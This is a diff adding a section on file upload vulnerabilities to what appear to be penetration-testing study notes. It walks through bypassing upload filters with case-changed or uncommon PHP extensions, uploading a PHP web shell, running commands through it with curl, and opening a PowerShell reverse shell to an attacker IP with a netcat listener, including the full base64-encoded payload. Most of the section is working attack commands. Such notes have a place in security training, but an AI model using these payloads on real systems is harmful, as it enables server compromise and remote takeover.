@@ -273,5 +273,61 @@ kali@kali:/usr/share/webshells/php/$ curl "http://targetwebsite.com/customer/ind
 If we see the output of the ls command, we should have successfully exploited an RFI vuln. You can take this a step further by using Netcat to create a reverse shell, as we did previously.
 
 
+## File Upload Vulnerabilities
 
+### Using Executable Files
 
+We can make educated guesses about where to find upload mechanisms in a webapp. If the webapp is a Content Management System (CMS), we might upload an avatar photo for a profile or attach files to blog posts.  If the webapp is a company website, we should look in careeer sections or company-specific use cases for file upload mechanisms. If we have a lawyer's office as a target website, there might be case file uploads. We should always enumerate!
+
+After finding a file upload mechanism, test what file types it accepts. In this example, have a photo upload, so lets try uploading something else.
+
+```console
+$ echo "accept me" > testing.txt
+```
+If this works, try the simple-backdoor.php we just used. Sometimes PHP files are blocked. We can try to bypass this filter by changing the file extension to a less-common PHP file extension like .phps or .php7. The most common ones that are often blocked would be .php and .phtml.
+
+We can also try to bypass the filter by simply changing the case of the extentions. Change .php. to .pHP.
+
+```
+Upload worked!
+
+File simple-backdoor.pHP has been uploaded in the uploads directory!
+```
+
+TIP: Another way to bypass a file type filter is to upload a file with an innocent .txt extension, and rename it within the web app back to the original extension.
+
+Use Curl to explore.
+
+```console
+$ curl http://111.111.111.111/customer/uploads/simple-backdoor.pHP?cmd=dir
+```
+If we get the directory, contents, we know we can try for a reverse shell now, using a PowerShell one-liner for the experience.
+
+```console
+$ nc -nlvp 4444
+
+// new terminal
+// IP IN $Text BELOW MUST BE ATTACKER IP!
+
+$ pwsh
+
+> $Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.247",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
+
+> $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+
+> $EncodedText =[Convert]::ToBase64String($Bytes)
+
+> $EncodedText
+
+> exit
+```
+
+Take the $Encoded Text value and put in at the end of ?cmd=powershell%20-enc%20__________.
+
+```console
+$ curl http://111.111.111.111/customer/uploads/simple-backdoor.pHP?cmd=powershell%20-enc%20JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADIANAA3ACIALAA0ADQANAA0ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA==
+```
+
+Our nc listener should indicate if we have a successful connection.
+
+If the target webapp was using ASP instead of PHP, we can follow the same exact steps with an ASP web shell from /usr/share/webshells/. 
